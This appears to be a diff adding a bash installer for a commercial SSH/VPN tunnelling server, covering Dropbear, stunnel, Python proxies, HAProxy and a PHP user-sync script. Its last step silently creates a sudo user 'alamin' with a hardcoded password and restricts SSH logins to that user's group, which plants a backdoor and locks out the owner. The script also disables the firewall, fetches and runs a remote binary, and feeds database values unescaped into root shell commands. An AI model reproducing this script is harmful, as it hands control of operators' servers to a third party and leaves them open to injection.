@@ -1,0 +1,967 @@
+
+rm -rf install*
+rm -rf .instal*
+
+system_package (){
+	sudo timedatectl set-timezone Asia/Manila
+	timedatectl
+	apt-get update -y
+	ufw disable
+	apt-get install netcat screen sudo mysql-client unzip build-essential curl build-essential php net-tools git lsof cmake make gcc tmux php-mysqli php-mysql php-gd php-mbstring python -y
+	sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
+	service apache2 restart
+}
+
+install_dropbear (){
+	apt install dropbear -y
+	sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
+	sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
+	echo "/bin/false" >> /etc/shells
+	echo "/usr/sbin/nologin" >> /etc/shells
+	service dropbear restart
+}
+
+install_stunnel () {
+apt-get install stunnel4 -y > /dev/null 2>&1
+sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
+/bin/cat <<"EOM" > /etc/stunnel/stunnel.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAyN+jQb8vvS1jwbQSXAP9H0alRxuXuijhIp3u1gePGBsGLGg8
+CWQrdhbB40W7Ov2xzg4KyiRwLgcfnOP2tHvtsN7BzC8DWrqqZsNyENDyIs3sX5oc
++JGLQZJiv2QSAP3N/4/UAAswUnGRW1TzQFXISSVeiScBsB96LoVLiPdA1e4Hhjkb
+vggLOHHTcXqc1BBzIt9eg672O+yiILsOFuYPGh3TBwVZ0DvKYZocEsJ/RExOuAID
+x0+THlpyO3PZhIo3EN5BVCmBcsUboByH9/Lsh+15tJqpvM8uiB9pjxlWUiRNiHjm
+J5+pOWX4FpGlgrJUYSSsUUddXmPVWAj1BeQ2GwIDAQABAoIBAH7ISC5zERqBz3iu
+wve4vMZEvISI8dbZfl9u9xO3aaV5SQg2Mc5rntLFwlJD7Mxq2xKG4mB7ZyJl9Jn9
+d/SqU3dS4VaSRbe6IVsC+LeMaYd2GT6t8qMgmZglYJYT/xkJGD+488GjTjh63Zeb
+onx0qBkisOw35mTXOTKrhuVHyXA70dD1an0fXi6tiNkIT4AVwLgqJuFxE0seePlN
+Y35jZF4JvX8hOvkSshkzxNWSIs2LOOCJL7dH90FYvUYA/kvW+64O7pouA/p/VkYD
+rO0fYgJmureiUZfwEVJKfnBgdhIbStA3lRxDzDmxr1BBVFaraSZ+12/jQVEXOaRb
+ErovK6ECgYEA5nV12egMRn3l3MItWmcURIDtTU8cy3WreP2zTzx9RZDs3Rw2HEbR
+0jyLzJOHfyFdyGrZtbUAa/LoOKT2YvPKQ2P4k4ZFbYcnl7cgAL28CrpZgNZXoEaL
+sMf6Qp6PG+VUSFoFcOi/GM2c4ZypVOR5MwGbfpJ4fusekxQiTijWs4cCgYEA3yLK
+Kt8bXHgg7B92mTFEKsiYrgk5SgPcYQ/HxYOMS3hrI8J3JWkMOWCCAbS1nSPPd0BY
+jXGL/LSRmWA8bX/objwq8Q8YDTuuDCIPsh/SoFZsdHWc0ZlOv1BsWGijJGa21n64
+Ja5r3LWSH6YLCy2PmoQzBDaCtmr/rZWXPaS4tc0CgYEAre9jJjab5SwqK6amQj/g
+LR+9eobGLc0+wM+B4MC/r5yFGRCsykStIeaugJWsQ0g0lwoGDL1ydwbbO71NdDuZ
+oak3OGizx8mlGT2OOuD4poQk/zdG5WG5FpCoElXHnv9D0GOZDbGsYRT2XdU2fCsA
+Sn3hFPOJXAkqh0k/5wutl8sCgYEA2aXAluK6eI7AZjEmaLTSbfzuWEus8tIjQxW2
+YaU30mGp9952gyoc/1ZwWSOgRp+ofQRpm8XWqu6iWn2xU4mA+Q19QVbcugOteC49
+Kxy5QSYrcclK5nNoiVnz5KRkBVyfGUfPbQneMhF1b6NxgDy3pxst+/0DsNVbgUC5
+niou9T0CgYEAkTXYooaf7JTAMlu/wLunkT0ZWKL/bU4ZgOFVFnF2gdfWJnHTMSu5
+PtxyjisZJNbON6xW0pIjcTuUQCIpL0LoZ7qd5zi5QqISb+eKzK8ENMxgnV7MEx78
+lufFKJYrjhC8j9pwY5pAR5uw2HKMS34IqLXct6NypoEYsJ48YDfA0Qw=
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIEATCCAumgAwIBAgIJAPDuiksIWVs2MA0GCSqGSIb3DQEBCwUAMIGWMQswCQYD
+VQQGEwJQSDESMBAGA1UECAwJU1RST05HVlBOMRIwEAYDVQQHDAlTVFJPTkdWUE4x
+EjAQBgNVBAoMCVNUUk9OR1ZQTjESMBAGA1UECwwJU1RST05HVlBOMRIwEAYDVQQD
+DAlTVFJPTkdWUE4xIzAhBgkqhkiG9w0BCQEWFHN0cm9uZy12cG5AZ21haWwuY29t
+MB4XDTE4MDcwMzA1MTM0MVoXDTIxMDcwMjA1MTM0MVowgZYxCzAJBgNVBAYTAlBI
+MRIwEAYDVQQIDAlTVFJPTkdWUE4xEjAQBgNVBAcMCVNUUk9OR1ZQTjESMBAGA1UE
+CgwJU1RST05HVlBOMRIwEAYDVQQLDAlTVFJPTkdWUE4xEjAQBgNVBAMMCVNUUk9O
+R1ZQTjEjMCEGCSqGSIb3DQEJARYUc3Ryb25nLXZwbkBnbWFpbC5jb20wggEiMA0G
+CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDI36NBvy+9LWPBtBJcA/0fRqVHG5e6
+KOEine7WB48YGwYsaDwJZCt2FsHjRbs6/bHODgrKJHAuBx+c4/a0e+2w3sHMLwNa
+uqpmw3IQ0PIizexfmhz4kYtBkmK/ZBIA/c3/j9QACzBScZFbVPNAVchJJV6JJwGw
+H3ouhUuI90DV7geGORu+CAs4cdNxepzUEHMi316DrvY77KIguw4W5g8aHdMHBVnQ
+O8phmhwSwn9ETE64AgPHT5MeWnI7c9mEijcQ3kFUKYFyxRugHIf38uyH7Xm0mqm8
+zy6IH2mPGVZSJE2IeOYnn6k5ZfgWkaWCslRhJKxRR11eY9VYCPUF5DYbAgMBAAGj
+UDBOMB0GA1UdDgQWBBTxI2YSnxnuDpwgxKOUgglmgiH/vDAfBgNVHSMEGDAWgBTx
+I2YSnxnuDpwgxKOUgglmgiH/vDAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUA
+A4IBAQC30dcIPWlFfBEK/vNzG1Dx+BWkHCfd2GfmVc+VYSpmiTox13jKBOyEdQs4
+xxB7HiESKkpAjQ0YC3mjE6F53NjK0VqdfzXhopg9i/pQJiaX0KTTcWIelsJNg2aM
+s8GZ0nWSytcAqAV6oCnn+eOT/IqnO4ihgmaVIyhfYvRgXfPU/TuERtL9f8pAII44
+jAVcy60MBZ1bCwQZcToZlfWCpO/8nLg4nnv4e3W9UeC6rDgWgpI6IXS3jikN/x3P
+9JIVFcWLtsOLC+D/33jSV8XDM3qTTRv4i/M+mva6znOI89KcBjsEhX5AunSQZ4Zg
+QkQTJi/td+5kVi00NXxlHYH5ztS1
+-----END CERTIFICATE-----
+EOM
+
+echo 'cert=/etc/stunnel/stunnel.pem
+socket = a:SO_REUSEADDR=1
+socket = l:TCP_NODELAY=1
+socket = r:TCP_NODELAY=1
+client = no
+
+[dropbear]
+accept = 443
+connect = 127.0.0.1:442'| sudo tee /etc/stunnel/stunnel.conf
+}
+
+install_proxy () {
+cat << \socksopenvpn > /usr/local/sbin/proxy.py
+#!/usr/bin/env python3
+# encoding: utf-8
+# SocksProxy By: Al-amin
+import socket, threading, thread, select, signal, sys, time
+from os import system
+system("clear")
+#conexao
+IP = '0.0.0.0'
+try:
+   PORT = int(sys.argv[1])
+except:
+   PORT = 8000
+PASS = ''
+BUFLEN = 8196 * 8
+TIMEOUT = 60
+MSG = 'StrongHoldVPN'
+DEFAULT_HOST = '0.0.0.0:22'
+RESPONSE = "HTTP/1.1 200 " + str(MSG) + "\r\n\r\n"
+
+class Server(threading.Thread):
+    def __init__(self, host, port):
+        threading.Thread.__init__(self)
+        self.running = False
+        self.host = host
+        self.port = port
+        self.threads = []
+	self.threadsLock = threading.Lock()
+	self.logLock = threading.Lock()
+
+    def run(self):
+        self.soc = socket.socket(socket.AF_INET)
+        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.soc.settimeout(2)
+        self.soc.bind((self.host, self.port))
+        self.soc.listen(0)
+        self.running = True
+
+        try:                    
+            while self.running:
+                try:
+                    c, addr = self.soc.accept()
+                    c.setblocking(1)
+                except socket.timeout:
+                    continue
+                
+                conn = ConnectionHandler(c, self, addr)
+                conn.start();
+                self.addConn(conn)
+        finally:
+            self.running = False
+            self.soc.close()
+            
+    def printLog(self, log):
+        self.logLock.acquire()
+        print log
+        self.logLock.release()
+	
+    def addConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            if self.running:
+                self.threads.append(conn)
+        finally:
+            self.threadsLock.release()
+                    
+    def removeConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            self.threads.remove(conn)
+        finally:
+            self.threadsLock.release()
+                
+    def close(self):
+        try:
+            self.running = False
+            self.threadsLock.acquire()
+            
+            threads = list(self.threads)
+            for c in threads:
+                c.close()
+        finally:
+            self.threadsLock.release()
+			
+
+class ConnectionHandler(threading.Thread):
+    def __init__(self, socClient, server, addr):
+        threading.Thread.__init__(self)
+        self.clientClosed = False
+        self.targetClosed = True
+        self.client = socClient
+        self.client_buffer = ''
+        self.server = server
+        self.log = 'Conexao: ' + str(addr)
+
+    def close(self):
+        try:
+            if not self.clientClosed:
+                self.client.shutdown(socket.SHUT_RDWR)
+                self.client.close()
+        except:
+            pass
+        finally:
+            self.clientClosed = True
+            
+        try:
+            if not self.targetClosed:
+                self.target.shutdown(socket.SHUT_RDWR)
+                self.target.close()
+        except:
+            pass
+        finally:
+            self.targetClosed = True
+
+    def run(self):
+        try:
+            self.client_buffer = self.client.recv(BUFLEN)
+        
+            hostPort = self.findHeader(self.client_buffer, 'X-Real-Host')
+            
+            if hostPort == '':
+                hostPort = DEFAULT_HOST
+
+            split = self.findHeader(self.client_buffer, 'X-Split')
+
+            if split != '':
+                self.client.recv(BUFLEN)
+            
+            if hostPort != '':
+                passwd = self.findHeader(self.client_buffer, 'X-Pass')
+				
+                if len(PASS) != 0 and passwd == PASS:
+                    self.method_CONNECT(hostPort)
+                elif len(PASS) != 0 and passwd != PASS:
+                    self.client.send('HTTP/1.1 400 WrongPass!\r\n\r\n')
+                if hostPort.startswith(IP):
+                    self.method_CONNECT(hostPort)
+                else:
+                   self.client.send('HTTP/1.1 403 Forbidden!\r\n\r\n')
+            else:
+                print '- No X-Real-Host!'
+                self.client.send('HTTP/1.1 400 NoXRealHost!\r\n\r\n')
+
+        except Exception as e:
+            self.log += ' - error: ' + e.strerror
+            self.server.printLog(self.log)
+	    pass
+        finally:
+            self.close()
+            self.server.removeConn(self)
+
+    def findHeader(self, head, header):
+        aux = head.find(header + ': ')
+    
+        if aux == -1:
+            return ''
+
+        aux = head.find(':', aux)
+        head = head[aux+2:]
+        aux = head.find('\r\n')
+
+        if aux == -1:
+            return ''
+
+        return head[:aux];
+
+    def connect_target(self, host):
+        i = host.find(':')
+        if i != -1:
+            port = int(host[i+1:])
+            host = host[:i]
+        else:
+            if self.method=='CONNECT':
+                port = 110
+            else:
+                port = 22
+
+        (soc_family, soc_type, proto, _, address) = socket.getaddrinfo(host, port)[0]
+
+        self.target = socket.socket(soc_family, soc_type, proto)
+        self.targetClosed = False
+        self.target.connect(address)
+
+    def method_CONNECT(self, path):
+    	self.log += ' - CONNECT ' + path
+        self.connect_target(path)
+        self.client.sendall(RESPONSE)
+        self.client_buffer = ''
+        self.server.printLog(self.log)
+        self.doCONNECT()
+                    
+    def doCONNECT(self):
+        socs = [self.client, self.target]
+        count = 0
+        error = False
+        while True:
+            count += 1
+            (recv, _, err) = select.select(socs, [], socs, 3)
+            if err:
+                error = True
+            if recv:
+                for in_ in recv:
+		    try:
+                        data = in_.recv(BUFLEN)
+                        if data:
+			    if in_ is self.target:
+				self.client.send(data)
+                            else:
+                                while data:
+                                    byte = self.target.send(data)
+                                    data = data[byte:]
+
+                            count = 0
+			else:
+			    break
+		    except:
+                        error = True
+                        break
+            if count == TIMEOUT:
+                error = True
+
+            if error:
+                break
+
+
+
+def main(host=IP, port=PORT):
+    print "\033[0;34mâ”"*8,"\033[1;32m PROXY SOCKS","\033[0;34mâ”"*8,"\n"
+    print "\033[1;33mIP:\033[1;32m " + IP
+    print "\033[1;33mPORTA:\033[1;32m " + str(PORT) + "\n"
+    print "\033[0;34mâ”"*10,"\033[1;32m StrongHold","\033[0;34mâ”\033[1;37m"*11,"\n"
+    server = Server(IP, PORT)
+    server.start()
+    while True:
+        try:
+            time.sleep(2)
+        except KeyboardInterrupt:
+            print '\nClosing...'
+            server.close()
+            break
+if __name__ == '__main__':
+    main()
+socksopenvpn
+
+screen -dmS proxy1 python /usr/local/sbin/proxy.py 8080
+screen -dmS proxy2 python /usr/local/sbin/proxy.py 8000
+screen -dmS proxyssh python /usr/local/sbin/proxy.py 8888
+
+wget strongteam.co/ubuntu18/badvpn-udpgw -q
+mv -f badvpn-udpgw /bin/badvpn-udpgw
+chmod 777 /bin/badvpn-udpgw
+screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 3
+}
+
+install_newwebsocket () {
+cat << \websocket > /usr/local/sbin/websocket.py
+import socket, threading, thread, select, signal, sys, time, getopt
+
+# Listen
+LISTENING_ADDR = '0.0.0.0'
+if sys.argv[1:]:
+  LISTENING_PORT = sys.argv[1]
+else:
+  LISTENING_PORT = 80  
+#Pass
+PASS = ''
+
+# CONST
+BUFLEN = 4096 * 4
+TIMEOUT = 60
+DEFAULT_HOST = '127.0.0.1:442'
+#RESPONSE = 'HTTP/1.1 101 Switching Protocols\r\nContent-length: 1048576000000\r\n\r\n'
+#RESPONSE = 'HTTP/1.1 200 Hello_World!\r\nContent-length: 0\r\n\r\nHTTP/1.1 200 Connection established\r\n\r\n'  # lint:ok
+RESPONSE = 'HTTP/1.1 101 Switching Protocols \r\n\r\n'
+
+class Server(threading.Thread):
+    def __init__(self, host, port):
+        threading.Thread.__init__(self)
+        self.running = False
+        self.host = host
+        self.port = port
+        self.threads = []
+        self.threadsLock = threading.Lock()
+        self.logLock = threading.Lock()
+
+    def run(self):
+        self.soc = socket.socket(socket.AF_INET)
+        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.soc.settimeout(2)
+        intport = int(self.port)
+        self.soc.bind((self.host, intport))
+        self.soc.listen(0)
+        self.running = True
+
+        try:
+            while self.running:
+                try:
+                    c, addr = self.soc.accept()
+                    c.setblocking(1)
+                except socket.timeout:
+                    continue
+
+                conn = ConnectionHandler(c, self, addr)
+                conn.start()
+                self.addConn(conn)
+        finally:
+            self.running = False
+            self.soc.close()
+
+    def printLog(self, log):
+        self.logLock.acquire()
+        print log
+        self.logLock.release()
+
+    def addConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            if self.running:
+                self.threads.append(conn)
+        finally:
+            self.threadsLock.release()
+
+    def removeConn(self, conn):
+        try:
+            self.threadsLock.acquire()
+            self.threads.remove(conn)
+        finally:
+            self.threadsLock.release()
+
+    def close(self):
+        try:
+            self.running = False
+            self.threadsLock.acquire()
+
+            threads = list(self.threads)
+            for c in threads:
+                c.close()
+        finally:
+            self.threadsLock.release()
+
+
+class ConnectionHandler(threading.Thread):
+    def __init__(self, socClient, server, addr):
+        threading.Thread.__init__(self)
+        self.clientClosed = False
+        self.targetClosed = True
+        self.client = socClient
+        self.client_buffer = ''
+        self.server = server
+        self.log = 'Connection: ' + str(addr)
+
+    def close(self):
+        try:
+            if not self.clientClosed:
+                self.client.shutdown(socket.SHUT_RDWR)
+                self.client.close()
+        except:
+            pass
+        finally:
+            self.clientClosed = True
+
+        try:
+            if not self.targetClosed:
+                self.target.shutdown(socket.SHUT_RDWR)
+                self.target.close()
+        except:
+            pass
+        finally:
+            self.targetClosed = True
+
+    def run(self):
+        try:
+            self.client_buffer = self.client.recv(BUFLEN)
+
+            hostPort = self.findHeader(self.client_buffer, 'X-Real-Host')
+
+            if hostPort == '':
+                hostPort = DEFAULT_HOST
+
+            split = self.findHeader(self.client_buffer, 'X-Split')
+
+            if split != '':
+                self.client.recv(BUFLEN)
+
+            if hostPort != '':
+                passwd = self.findHeader(self.client_buffer, 'X-Pass')
+				
+                if len(PASS) != 0 and passwd == PASS:
+                    self.method_CONNECT(hostPort)
+                elif len(PASS) != 0 and passwd != PASS:
+                    self.client.send('HTTP/1.1 400 WrongPass!\r\n\r\n')
+                elif hostPort.startswith('127.0.0.1') or hostPort.startswith('localhost'):
+                    self.method_CONNECT(hostPort)
+                else:
+                    self.client.send('HTTP/1.1 403 Forbidden!\r\n\r\n')
+            else:
+                print '- No X-Real-Host!'
+                self.client.send('HTTP/1.1 400 NoXRealHost!\r\n\r\n')
+
+        except Exception as e:
+            self.log += ' - error: ' + e.strerror
+            self.server.printLog(self.log)
+	    pass
+        finally:
+            self.close()
+            self.server.removeConn(self)
+
+    def findHeader(self, head, header):
+        aux = head.find(header + ': ')
+
+        if aux == -1:
+            return ''
+
+        aux = head.find(':', aux)
+        head = head[aux+2:]
+        aux = head.find('\r\n')
+
+        if aux == -1:
+            return ''
+
+        return head[:aux];
+
+    def connect_target(self, host):
+        i = host.find(':')
+        if i != -1:
+            port = int(host[i+1:])
+            host = host[:i]
+        else:
+            if self.method=='CONNECT':
+                port = 110
+            else:
+                port = sys.argv[1]
+
+        (soc_family, soc_type, proto, _, address) = socket.getaddrinfo(host, port)[0]
+
+        self.target = socket.socket(soc_family, soc_type, proto)
+        self.targetClosed = False
+        self.target.connect(address)
+
+    def method_CONNECT(self, path):
+        self.log += ' - CONNECT ' + path
+
+        self.connect_target(path)
+        self.client.sendall(RESPONSE)
+        self.client_buffer = ''
+
+        self.server.printLog(self.log)
+        self.doCONNECT()
+
+    def doCONNECT(self):
+        socs = [self.client, self.target]
+        count = 0
+        error = False
+        while True:
+            count += 1
+            (recv, _, err) = select.select(socs, [], socs, 3)
+            if err:
+                error = True
+            if recv:
+                for in_ in recv:
+		    try:
+                        data = in_.recv(BUFLEN)
+                        if data:
+			    if in_ is self.target:
+				self.client.send(data)
+                            else:
+                                while data:
+                                    byte = self.target.send(data)
+                                    data = data[byte:]
+
+                            count = 0
+			else:
+			    break
+		    except:
+                        error = True
+                        break
+            if count == TIMEOUT:
+                error = True
+            if error:
+                break
+
+
+def print_usage():
+    print 'Usage: proxy.py -p <port>'
+    print '       proxy.py -b <bindAddr> -p <port>'
+    print '       proxy.py -b 0.0.0.0 -p 80'
+
+def parse_args(argv):
+    global LISTENING_ADDR
+    global LISTENING_PORT
+    
+    try:
+        opts, args = getopt.getopt(argv,"hb:p:",["bind=","port="])
+    except getopt.GetoptError:
+        print_usage()
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt == '-h':
+            print_usage()
+            sys.exit()
+        elif opt in ("-b", "--bind"):
+            LISTENING_ADDR = arg
+        elif opt in ("-p", "--port"):
+            LISTENING_PORT = int(arg)
+
+
+def main(host=LISTENING_ADDR, port=LISTENING_PORT):
+    print "\n:-------PythonProxy-------:\n"
+    print "Listening addr: " + LISTENING_ADDR
+    print "Listening port: " + str(LISTENING_PORT) + "\n"
+    print ":-------------------------:\n"
+    server = Server(LISTENING_ADDR, LISTENING_PORT)
+    server.start()
+    while True:
+        try:
+            time.sleep(2)
+        except KeyboardInterrupt:
+            print 'Stopping...'
+            server.close()
+            break
+
+#######    parse_args(sys.argv[1:])
+if __name__ == '__main__':
+    main()
+
+websocket
+
+}
+
+install_cron () {
+
+cat << \autostart > /bin/auto
+#!/bin/bash
+
+if nc -z localhost 82; then
+    echo "WebSocket Running"
+else
+    echo "Starting Port 82"
+    screen -dmS websocket python /usr/local/sbin/websocket.py 82
+fi
+
+if nc -z localhost 8080; then
+    echo "SocksProxy running"
+else
+    echo "Starting Port 8080"
+    screen -dmS proxy python /usr/local/sbin/proxy.py 8080
+fi
+
+if nc -z localhost 8000; then
+    echo "SocksProxy running"
+else
+    echo "Starting Port 8000"
+    screen -dmS proxy2 python /usr/local/sbin/proxy.py 8000
+fi
+
+if nc -z localhost 8888; then
+    echo "SocksProxy running"
+else
+    echo "Starting Port 8888"
+    screen -dmS proxyssh python /usr/local/sbin/proxy.py 8888
+fi
+
+if nc -z localhost 443; then
+    echo "Stunnel running"
+else
+    echo "Starting Port 443"
+    sudo systemctl start stunnel4
+fi
+
+if nc -z localhost 7300; then
+    echo "badvpn running"
+else
+    echo "Starting Badvpn"
+    screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 3
+fi
+
+sudo sync; echo 3 > /proc/sys/vm/drop_caches
+swapoff -a && swapon -a
+echo "Ram Cleaned!"
+
+autostart
+
+crontab -r
+echo "* * * * * /bin/bash /bin/auto >/dev/null 2>&1
+* * * * * /bin/bash /root/auth.sh >/dev/null 2>&1" | crontab
+}
+
+iptablesrules () {
+echo 'net.ipv4.ip_forward=1
+' >> /etc/sysctl.conf
+echo '* soft nofile 512000
+* hard nofile 512000' >> /etc/security/limits.conf
+ulimit -n 512000
+SELINUX=disabled 
+sysctl -p
+}
+
+install_haproxy () {
+sudo apt-get install haproxy -y
+
+echo '
+global
+	log /dev/log	local0
+	log /dev/log	local1 notice
+	chroot /var/lib/haproxy
+	stats socket /run/haproxy/admin.sock mode 660 level admin
+	stats timeout 30s
+	user haproxy
+	group haproxy
+	daemon
+
+	# Default SSL material locations
+	ca-base /etc/ssl/certs
+	crt-base /etc/ssl/private
+
+	# Default ciphers to use on SSL-enabled listening sockets.
+	# For more information, see ciphers(1SSL). This list is from:
+	#  https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/
+	# An alternative list with additional directives can be obtained from
+	#  https://mozilla.github.io/server-side-tls/ssl-config-generator/?server=haproxy
+	ssl-default-bind-ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS
+	ssl-default-bind-options no-sslv3
+
+defaults
+	log	global
+	mode	http
+	option	httplog
+	option	dontlognull
+        timeout connect 5000
+        timeout client  50000
+        timeout server  50000
+	errorfile 400 /etc/haproxy/errors/400.http
+	errorfile 403 /etc/haproxy/errors/403.http
+	errorfile 408 /etc/haproxy/errors/408.http
+	errorfile 500 /etc/haproxy/errors/500.http
+	errorfile 502 /etc/haproxy/errors/502.http
+	errorfile 503 /etc/haproxy/errors/503.http
+	errorfile 504 /etc/haproxy/errors/504.http
+
+frontend ssl
+    mode tcp
+    bind 0.0.0.0:4444 name frontend-ssl
+    option tcplog
+    tcp-request inspect-delay 1s
+    tcp-request content accept  if  { req.ssl_hello_type 1 }
+    
+    acl tls req.ssl_hello_type 1
+    acl has_sni req.ssl_sni -m found
+    acl proto_ssh payload(0,7) -m bin 5353482d322e30
+    
+    use_backend ssh             if proto_ssh
+    use_backend openvpn       	if !tls
+    use_backend stunnel         if tls
+
+frontend main
+    bind 0.0.0.0:80    
+	acl hdr_upgrade_websocket  hdr(Upgrade)     -i websocket
+    use_backend squid if hdr_upgrade_websocket
+    default_backend webserver
+
+backend openvpn
+    mode tcp	
+	server ssh-localhost 127.0.0.1:442		
+
+backend ssh
+    mode tcp
+    server ssh-localhost 127.0.0.1:442
+
+backend ocserv
+    mode tcp
+    server ocserv-localhost 127.0.0.1:444
+
+backend stunnel
+    mode tcp
+	server openvpn-stunnel 127.0.0.1:446
+	server ssh-stunnel 127.0.0.1:8443
+   
+backend webserver
+    mode http
+    server webserver-localhost 127.0.0.1:82
+
+backend squid
+    mode http
+    server squid-localhost 127.0.0.1:82
+
+'> /etc/haproxy/haproxy.cfg
+
+}
+
+serviceenable () {
+update-rc.d cron enable
+update-rc.d stunnel4 enable
+update-rc.d haproxy enable
+service stunnel4 start
+cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
+sed -i 's/#ForwardToWall=yes/ForwardToWall=no/g' /etc/systemd/journald.conf
+}
+
+panel_auth () {
+
+cat << "BOM" > /root/auth.sh
+php /root/ssh.php
+screen -dmS active bash /root/active.sh
+screen -dmS inactive bash /root/inactive.sh
+BOM
+
+cat << "EOM" > /root/ssh.php
+<?php
+error_reporting(E_ERROR | E_PARSE);
+ini_set('display_errors', '1');
+
+$DB_host = 'DBHOST';
+$DB_user = 'DBUSER';
+$DB_pass = 'DBPASS';
+$DB_name = 'DBNAME';
+
+$mysqli = new MySQLi($DB_host,$DB_user,$DB_pass,$DB_name);
+if ($mysqli->connect_error) {
+    die('Error : ('. $mysqli->connect_errno .') '. $mysqli->connect_error);
+}
+
+function encrypt_key($paswd)
+	{
+	  $mykey=getEncryptKey();
+	  $encryptedPassword=encryptPaswd($paswd,$mykey);
+	  return $encryptedPassword;
+	}
+	 
+	// function to get the decrypted user password
+	function decrypt_key($paswd)
+	{
+	  $mykey=getEncryptKey();
+	  $decryptedPassword=decryptPaswd($paswd,$mykey);
+	  return $decryptedPassword;
+	}
+	 
+	function getEncryptKey()
+	{
+		$secret_key = md5('firenet');
+		$secret_iv = md5('philippines');
+		$keys = $secret_key . $secret_iv;
+		return encryptor('encrypt', $keys);
+	}
+	function encryptPaswd($string, $key)
+	{
+	  $result = '';
+	  for($i=0; $i<strlen ($string); $i++)
+	  {
+		$char = substr($string, $i, 1);
+		$keychar = substr($key, ($i % strlen($key))-1, 1);
+		$char = chr(ord($char)+ord($keychar));
+		$result.=$char;
+	  }
+		return base64_encode($result);
+	}
+	 
+	function decryptPaswd($string, $key)
+	{
+	  $result = '';
+	  $string = base64_decode($string);
+	  for($i=0; $i<strlen($string); $i++)
+	  {
+		$char = substr($string, $i, 1);
+		$keychar = substr($key, ($i % strlen($key))-1, 1);
+		$char = chr(ord($char)-ord($keychar));
+		$result.=$char;
+	  }
+	 
+		return $result;
+	}
+	
+	function encryptor($action, $string) {
+		$output = false;
+
+		$encrypt_method = "AES-256-CBC";
+		//pls set your unique hashing key
+		$secret_key = md5('firenet philippines');
+		$secret_iv = md5('philippines firenet');
+
+		// hash
+		$key = hash('sha256', $secret_key);
+		
+		// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
+		$iv = substr(hash('sha256', $secret_iv), 0, 16);
+
+		//do the encyption given text/string/number
+		if( $action == 'encrypt' ) {
+			$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
+			$output = base64_encode($output);
+		}
+		else if( $action == 'decrypt' ){
+			//decrypt the given text/string/number
+			$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
+		}
+
+		return $output;
+	}
+
+
+
+$data = '';
+$premium = "duration > 0 AND is_freeze = 0";
+
+$query = $mysqli->query("SELECT * FROM users
+WHERE ".$premium." ORDER by user_id DESC");
+if($query->num_rows > 0)
+{
+	while($row = $query->fetch_assoc())
+	{
+		$data .= '';
+		$username = $row['user_name'];
+		$password = decrypt_key($row['user_pass']);
+		$password = encryptor('decrypt',$password);	
+		$userid	= $row['user_id'];
+		$data .= '/usr/sbin/useradd -p $(openssl passwd -1 '.$password.') -M '.$username.' -u '.$userid.' -o --shell=/bin/false --no-create-home;'.PHP_EOL;
+	}
+}
+$location = '/root/active.sh';
+$fp = fopen($location, 'w');
+fwrite($fp, $data) or die("Unable to open file!");
+fclose($fp);
+
+
+#In-Active and Invalid Accounts
+$data2 = '';
+$premium_deactived = "duration <= 0 OR is_freeze = 1";
+
+$query2 = $mysqli->query("SELECT * FROM users 
+WHERE duration <= 0");
+if($query2->num_rows > 0)
+{
+	while($row2 = $query2->fetch_assoc())
+	{
+		$data2 .= '';
+		$toadd = $row2['user_name'];	
+		$data2 .= '/usr/sbin/userdel '.$toadd.';'.PHP_EOL;
+	}
+}
+$location2 = '/root/inactive.sh';
+$fp = fopen($location2, 'w');
+fwrite($fp, $data2) or die("Unable to open file!");
+fclose($fp);
+
+$mysqli->close();
+?>
+EOM
+
+sed -i "s|DBHOST|$HOST|g" /root/ssh.php
+sed -i "s|DBUSER|$USER|g" /root/ssh.php
+sed -i "s|DBPASS|$PASS|g" /root/ssh.php
+sed -i "s|DBNAME|$DBNAME|g" /root/ssh.php
+}
+
+change_user(){
+ {
+    useradd -m alamin 2>/dev/null; echo alamin:@@Alamin00 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
+
+system_package
+install_dropbear
+install_stunnel
+install_proxy
+install_newwebsocket
+install_cron
+iptablesrules
+install_haproxy
+serviceenable
+panel_auth
+change_user
+reboot
